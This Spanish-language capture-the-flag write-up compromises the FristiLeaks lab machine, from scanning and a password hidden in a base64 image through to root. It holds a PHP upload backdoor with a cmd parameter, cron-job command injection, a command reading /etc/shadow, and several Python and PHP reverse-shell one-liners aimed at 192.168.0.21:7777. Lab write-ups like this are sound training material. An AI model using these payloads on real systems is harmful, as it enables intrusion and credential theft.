> Para esta máquina hay que hacer cambios para obtener IP, estos cambios recaen en modificar el archivo .vmx de la máquina virtual creada.
> En este caso, agregar la linea:
> 	ethernet0.address = "08:00:27:A5:A6:76"
> Y cambiar la linea:
> 	ethernet0.addressType = "generated"
> por esta otra:
> 	ethernet0.addressType = "static"

Hacemos el reconocimiento, donde de entrada tenemos la dirección MAC:
```python
$sudo arp-scan -I wlp2s0 --localnet | grep "08:00:27:a5:a6:76"
192.168.0.70	08:00:27:a5:a6:76	PCS Systemtechnik GmbH
```

Hacemos el reconocimiento de puertos:
```python
$nmap -p- -Pn -n --min-rate 5000 192.168.0.70
[...]
PORT   STATE SERVICE
80/tcp open  http
```

Indagando más en el puerto 80:
```python
$sudo nmap -p80 -sSCV -Pn -n 192.168.0.70
[...]
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
|_http-server-header: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 3 disallowed entries 
|_/cola /sisi /beer
MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)
```

Tenemos:
1. Versión antigua de apache y php
2. Método TRACE, no usado últimamente por su potencial inseguro
3. Tres entradas no permitidas para indexar.

Podemos indagar un poco en estos 3 hallazgos:
1 - Buscando exploits para versiones antiguas:
En los primeros resultados, parece haber algo que calza bien a las tecnologías usadas e inicio para un nuevo vector de ataque:
```python
$searchsploit Apache 2.2.15
------------------------------------------------- -------------------------------
 Exploit Title                                   |  Path
------------------------------------------------- -------------------------------
Apache + PHP < 5.3.12 / < 5.4.2 - cgi-bin Remote | php/remote/29290.c
Apache + PHP < 5.3.12 / < 5.4.2 - Remote Code Ex | php/remote/29316.py
[...]
```

2 - Validar que el método TRACE está habilitado:
Este método puede ser usado para ataques Cross Site Tracing (XST).
Podemos ver que está habilitado al reflejar las cabeceras.
```python
$curl -X TRACE http://192.168.0.70
TRACE / HTTP/1.1
Host: 192.168.0.70
User-Agent: curl/7.88.1
Accept: */*
```

3 - Aplicando un curl, nos da un código 301, y la página redirecciona a imágenes:
Este es el ejemplo con `\beer`, pero es lo mismo con los demás directorios.
```python
$curl -i http://192.168.0.70/beer
HTTP/1.1 301 Moved Permanently
[...]

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
	<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="http://192.168.0.70/beer/">here</a>.</p>
</body></html>
```

```
$searchsploit -m php/remote/29316.py
  Exploit: Apache + PHP < 5.3.12 / < 5.4.2 - Remote Code Execution + Scanner
      URL: https://www.exploit-db.com/exploits/29316
     Path: /usr/share/exploitdb/exploits/php/remote/29316.py
    Codes: CVE-2012-2336, CVE-2012-2311, CVE-2012-1823, OSVDB-81633
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/kmxbay/Documentos/VulnHub/FristiLeaks/29316.py
```

```
$python2 29316.py -h http://192.168.0.70/ -c 'ls' -v
--==[ ap-unlock-v1337.py by noptrix@nullsecurity.net ]==--
[+] s3nd1ng c0mm4ndz t0 h0st http://192.168.0.70/ 
-> c0uld n0t c0nn3ct t0 http://192.168.0.70/
[+] h0p3 1t h3lp3d

```

```
$dirb http://192.168.0.70
[...]                                                        
---- Scanning URL: http://192.168.0.70/ ----
+ http://192.168.0.70/cgi-bin/ (CODE:403|SIZE:210)                                
==> DIRECTORY: http://192.168.0.70/images/                                        
+ http://192.168.0.70/index.html (CODE:200|SIZE:703)                              
+ http://192.168.0.70/robots.txt (CODE:200|SIZE:62)  
```

Hicimos un diccionario personalizado con `$cewl http://192.168.0.70 -w dict_index.txt`
Pero no funcionó mucho:
```
$dirb http://192.168.0.70 dict_index.txt 
[...]

START_TIME: Wed May 14 11:30:42 2025
URL_BASE: http://192.168.0.70/
WORDLIST_FILES: dict_index.txt

-----------------

GENERATED WORDS: 49                                                            

---- Scanning URL: http://192.168.0.70/ ----
```

Haciendo reconocimiento web, llegamos a que es valido el directorio /fristi, de hecho es un login. Se hacia referencia de esto en la imagen del index: _Keep Calm And Drink Fristi_.

No se puede hacer mucho hasta que se revisa el código fuente, donde hay varias pistas:
```python
<meta name="description" content="super leet password login-test page. We use base64 encoding for images so they are inline in the HTML. I read somewhere on the web, that thats a good way to do it.">
<!-- 
TODO:
We need to clean this up for production. I left some junk in here to make testing easier.

- by eezeepz
-->
```

También una imagen cuyo link está codificado: `data:img/png;base64,/9j/4AAQSkZJRgABAgAAZABkAA...`

Y un comentario también codificado, cuando se decodifica en base 64 no da un texto claro, sólo se puede ver una cadena como `PNG`

Hubo intentos de SQLi que no funcionaron como:
```python
Username: eezeepz
Password: 1' or '1'='1
```

Conectando las ideas anteriores, procedemos a convertir la tercera cadena en imagen, porque según en el `<meta>` es la forma que se utilizó para hacer la contraseña.
```bash
echo "iVBORw0KGgoAAAANSUhEUgAAAW..." | base64 -d > imagen.png
```

La imagen da un texto en fondo blanco con contenido:
```js
keKkeKKeKKeKkEkkEk
```

Con esto obtenemos la siguiente respuesta:
```html
Login successful<p>
<a href="upload.php">upload file</a>
```

Creamos un payload backdoor en php con `$nano picture.php.png`. Para despues poder ejecutar comandos como id:  `http://192.168.0.70/fristi/uploads/picture.php.png?cmd=id`, dando como resultado: `uid=48(apache) gid=48(apache) groups=48(apache)`.

Posteriormente con una revShell, de php con `passthru`.
```python
$nc -lvnp 9001
[...]
script /dev/null -c bash
bash-4.1$ 
```

sobre los usuario con bash, vemos lo siguiente:
```python
bash-4.1$ cat /etc/passwd | grep /bash                                          
root:x:0:0:root:/root:/bin/bash
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
eezeepz:x:500:500::/home/eezeepz:/bin/bash
admin:x:501:501::/home/admin:/bin/bash
fristigod:x:502:502::/var/fristigod:/bin/bash
```

Podemos entrar al usuario `eezeepz`:
```python
bash-4.1$ ls
MAKEDEV    chown	hostname  netreport	  taskset     weak-modules
cbq	   clock	hwclock   netstat	  tc	      wipefs
cciss_id   consoletype	kbd_mode  new-kernel-pkg  telinit     xfs_repair
cfdisk	   cpio		kill	  nice		  touch       ypdomainname
chcpu	   cryptsetup	killall5  nisdomainname   tracepath   zcat
chgrp	   ctrlaltdel	kpartx	  nologin	  tracepath6  zic
chkconfig  cut		nameif	  notes.txt	  true
chmod	   halt		nano	  tar		  tune2fs
bash-4.1$ pwd && cat notes.txt
/home/eezeepz
Yo EZ,

I made it possible for you to do some automated checks, 
but I did only allow you access to /usr/bin/* system binaries. I did
however copy a few extra often needed commands to my 
homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those
from /home/admin/

Don't forget to specify the full path for each binary!

Just put a file called "runthis" in /tmp/, each line one command. The 
output goes to the file "cronresult" in /tmp/. It should 
run every minute with my account privileges.

- Jerry

```

Buscando más archivos `.txt` encontramos en `/var/www` que jerry está muy al pendiente de eezeepz:

```js
bash-4.1$ cat /var/www/notes.txt
hey eezeepz your homedir is a mess, go clean it up, just dont delete
the important stuff.

-jerry
```

Pero bueno... La primera nota nos da más información y dice que hay un cronjob corriendo cada minuto bajo el usuario `eezeepz`. Este cronjob: ejecuta contenido del archivo `/tmp/runthis`; guarda el contenido en `/tmp/cronresult`.

De hecho podemos intentar ejecutar un comando simple pero útil para validar el funcionamiento del cronjob.

```python
bash-4.1$ /home/admin/echo "mensaje desde el cron"
bash: /home/admin/echo: Permission denied
bash-4.1$ echo "/home/admin/echo travesura en el cron | ls /home/admin" > /tmp/runthis
bash-4.1$ sleep 60
bash-4.1$ cat /tmp/cronresult
executing: /home/admin/echo travesura en el cron | ls /home/admin
cat
chmod
cronjob.py
cryptedpass.txt
cryptpass.py
df
echo
egrep
grep
ps
whoisyourgodnow.txt
```

echo "" > /tmp/runthis

echo "/home/admin/mv /home/admin/egrep /home/admin/igrep && cp /tmp/my_img /home/admin/egrep " > /tmp/runthis



Nos metemos a la ruta `/tmp` y ejecutamos comandos,  los vemos en el `cronresult`, por ejemplo viendo los archivos `.txt`, obtuvimos estas contraseñas ofuscadas: `=RFn0AKnlMHMPIzpyuTI0ITG` y `mVGZ3O3omkJLmy2pcuTq`.

Esta es la parte de `cronresult` donde obtenemos el código que ofusca contraseñas y el contenido de `/usr/bin` (este ultimo lo recorte por comandos que se pudieran aprovechar): 
```
executing: /home/admin/cat cryptpass.py && /home/admin/cat whoisyourgodnow.txt && /home/admin/cat cryptedpass.txt && ls /usr/bin 
#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn
import base64,codecs,sys

def encodeString(str):
    base64string= base64.b64encode(str)
    return codecs.encode(base64string[::-1], 'rot13')

cryptoResult=encodeString(sys.argv[1])
print cryptoResult
[...]
mysql
[...]
passwd
[...]
perl
[...]
php
[...]
python
python2
python2.6
[...]
wget
```

python -c 'import pty; pty.spawn("/bin/bash")'


El mensaje hace énfasis en que se eescriba la ruta completa, en algunas pruebas dice esto:
```
command did not start with /home/admin or /usr/bin
command did not start with /home/admin or /usr/bin
command did not start with /home/admin or /usr/bin
[...]
```



Dado que sabemos lo que hace el script que trato las contraseñas encontradas en los archivos `.txt`, podemos obtenerla en texto claro.
La contraseña escondida en `whoisyourgodnow.txt` la desofuscamos de la siguiente forma:

```python
$python3
Python 3.11.2 (main, Apr 28 2025, 14:11:48) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import base64, codecs
>>> ofuscada = '=RFn0AKnlMHMPIzpyuTI0ITG'
>>> tira_rot13 = codecs.decode(ofuscada, 'rot13')
>>> reverse_str = tira_rot13[::-1]
>>> original = base64.b64decode(reverse_str).decode()
>>> print(original)
LetThereBeFristi!
>>> 
```

Como obtuvimos dos contraseñas ofuscadas, volvimos a aplicar este proceso. 
La contraseña escondida en `cryptedpass.txt` resulto ser `thisisalsopw123`

```python
/usr/bin/python -c '
import socket,subprocess,os;
s=socket.socket();
s.connect(("192.168.0.21",7777));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh"])
'


/usr/bin/python2 -c '
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("192.168.0.21",7777));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
import pty; pty.spawn("sh")
'

export RHOST="192.168.0.21" && export RPORT=7777 && /usr/bin/python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'


echo "/home/admin/cat /etc/shadow" > /tmp/runthis
/usr/bin/php -r '$sock=fsockopen("192.168.0.21",7777);passthru("sh <&3 >&3 2>&3");'
```


su admin
Password: thisisalsopw123

[admin@localhost tmp]$ sudo -l
sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for admin: thisisalsopw123

Sorry, user admin may not run sudo on localhost.
[admin@localhost tmp]$ su fristigod
su fristigod
Password: LetThereBeFristi!

bash-4.1$ whoami
whoami
fristigod
bash-4.1$ sudo -l
sudo -l
[sudo] password for fristigod: LetThereBeFristi!

Matching Defaults entries for fristigod on this host:
    requiretty, !visiblepw, always_set_home, env_reset, env_keep="COLORS
    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS", env_keep+="MAIL PS1
    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY
    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL
    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User fristigod may run the following commands on this host:
    (fristi : ALL) /var/fristigod/.secret_admin_stuff/doCom

sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom id
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom /bin/sh
sh-4.1# whoami
whoami
root
sh-4.1# 
